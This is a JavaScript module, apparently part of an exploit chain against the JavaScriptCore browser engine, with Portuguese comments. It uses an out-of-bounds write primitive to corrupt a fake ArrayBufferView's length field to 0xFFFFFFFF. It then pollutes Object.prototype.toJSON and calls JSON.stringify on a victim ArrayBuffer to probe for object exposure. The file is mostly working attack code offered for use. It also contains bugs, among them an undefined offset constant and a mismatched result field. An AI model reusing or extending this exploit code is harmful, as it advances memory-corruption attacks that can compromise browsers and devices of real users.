// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const FNAME_MAIN = "ExploitLogic_v25_MinimalVictimProbe";

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF; 
const VICTIM_AB_SIZE = 64;

let minimal_probe_results = null;

function toJSON_MinimalProbeOnVictim() {
    const FNAME_toJSON = "toJSON_MinimalProbeOnVictim";
    minimal_probe_results = {
        probe_called: true,
        this_type: "N/A_before_call",
        error: null
    };
    try {
        // Apenas a operação mais básica para ver se 'this' é acessível
        minimal_probe_results.this_type = Object.prototype.toString.call(this); 
        // Não logar daqui para ser o mais leve possível
    } catch (e) {
        minimal_probe_results.error = `${e.name}: ${e.message}`;
    }
    return minimal_probe_results; // Retorna o objeto diretamente
}

export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.minimalVictimProbe`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Sondagem Mínima em victim_ab Pós-Corrupção ---`, "test", FNAME_CURRENT_TEST);
    document.title = `MinimalVictimProbe v25`;

    minimal_probe_results = null;
    let errorCaptured = null;
    let stringifyResult = null;
    let potentiallyCrashed = true; 
    let stepReached = "init";

    // Calcular o offset de corrupção crítico
    // Usa ArrayBufferView.M_LENGTH_OFFSET porque a ESTRUTURA FAKE que plantamos era de uma View,
    // e o 0x70/0x7C era o m_length dessa estrutura fake.
    // A escrita OOB é no oob_array_buffer_real, mas o offset é relevante para a *estrutura* que estava lá.
    const critical_oob_write_offset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70 padrão, ou 0x7C se M_LENGTH_OFFSET é 0x24
    // Para ser mais preciso com o log anterior que mostrou 0x7C:
    // const critical_oob_write_offset_calc = 0x58 + parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
    // logS3(`  (Nota: Offset 0x70 usado nos textos anteriores. Com M_LENGTH_OFFSET=${JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET}, o offset de m_length da view em 0x58 seria ${toHex(critical_oob_write_offset_calc)})`, "info", FNAME_CURRENT_TEST);
    // Vamos usar o 0x70 (ou 0x7C) que causava o problema. Se M_LENGTH_OFFSET é 0x24, o 0x7C é o que queremos.
    const M_LENGTH_OFFSET_IN_VIEW_STRUCT = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
    const corruptionTargetOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + M_LENGTH_OFFSET_IN_VIEW_STRUCT; // Ex: 0x58 + 0x24 = 0x7C

    try {
        stepReached = "oob_setup";
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // PASSO 1 (Opcional, mas mantido para consistência com o que causava o crash): Plantar a estrutura fake com m_length seguro
        // Isso assegura que oob_array_buffer_real[0x7C] (ou 0x70) é tocado com um valor antes de ser sobrescrito.
        const FAKE_VIEW_MLENGTH_INITIAL_PLANT_TEMP = 0x100; 
        const mLengthOffset_temp  = FAKE_VIEW_BASE_OFFSET_IN_OOB + M_LENGTH_OFFSET_IN_VIEW_STRUCT;
        oob_write_absolute(mLengthOffset_temp, FAKE_VIEW_MLENGTH_INITIAL_PLANT_TEMP, 4);
        logS3(`PASSO 1: Valor inicial ${toHex(FAKE_VIEW_MLENGTH_INITIAL_PLANT_TEMP)} escrito em oob_ab[${toHex(mLengthOffset_temp)}] (m_length da estrutura fake).`, "info", FNAME_CURRENT_TEST);

        // PASSO 2: Escrita OOB CRÍTICA em oob_array_buffer_real
        stepReached = "critical_oob_write";
        logS3(`PASSO 2: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffset)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffset, CRITICAL_OOB_WRITE_VALUE, 4); // Escreve 0xFFFFFFFF
        logS3(`  Escrita crítica em ${toHex(corruptionTargetOffset)} realizada.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(50);

        // PASSO 3: Criar victim_ab e tentar JSON.stringify com toJSON poluído
        stepReached = "victim_creation";
        let victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
        logS3(`PASSO 3: victim_ab (${VICTIM_AB_SIZE} bytes) criado. Tentando JSON.stringify(victim_ab) com ${toJSON_MinimalProbeOnVictim.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            stepReached = "pp_pollution";
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_MinimalProbeOnVictim,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_MinimalProbeOnVictim.name}.`, "info", FNAME_CURRENT_TEST);

            stepReached = "before_stringify_victim";
            logS3(`  Chamando JSON.stringify(victim_ab)...`, "info", FNAME_CURRENT_TEST);
            stringifyResult = JSON.stringify(victim_ab); 
            potentiallyCrashed = false; 
            
            logS3(`  JSON.stringify(victim_ab) completou. Resultado da toJSON: ${stringifyResult ? JSON.stringify(stringifyResult) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (stringifyResult && stringifyResult.error) {
                logS3(`    ERRO DENTRO da toJSON_MinimalProbeOnVictim: ${stringifyResult.error}`, "error", FNAME_CURRENT_TEST);
                errorCaptured = new Error(stringifyResult.error); // Para que seja pego pelo log de erro geral
            } else if (stringifyResult && stringifyResult.probe_called) {
                logS3(`    toJSON_MinimalProbeOnVictim foi chamada. Tipo de 'this': ${stringifyResult.this_type_in_probe}`, "good", FNAME_CURRENT_TEST);
            }

        } catch (e_stringify) {
            errorCaptured = e_stringify;
            potentiallyCrashed = false;
            stepReached = "error_in_stringify";
            logS3(`  ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e_stringify.name} - ${e_stringify.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `MinimalProbe CRASH: ${e_stringify.name}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_main) {
        errorCaptured = e_main;
        potentiallyCrashed = false; 
        logS3(`ERRO CRÍTICO GERAL: ${e_main.name} - ${e_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_main.stack) logS3(`Stack: ${e_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU: ${e_main.name}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} (Último passo: ${stepReached}) Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
    return { errorOccurred: errorCaptured, potentiallyCrashed, stringifyResult, getter_probe_details: minimal_probe_results };
}
